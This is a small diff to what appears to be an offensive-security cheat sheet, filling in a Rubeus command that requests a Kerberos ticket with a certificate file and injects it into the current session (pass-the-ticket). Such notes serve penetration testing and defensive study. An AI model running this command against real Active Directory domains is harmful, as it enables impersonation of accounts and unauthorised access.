@@ -41,7 +41,7 @@ XXX
 Authenticate with a certificate:
 
 ```powershell
-> Rubeus.exe asktgt 
+> Rubeus.exe asktgt /user:<username> /certificate:<path to pfx> /password:<pfx pass> /ptt /nowrap
 ```
 
 ## Tools
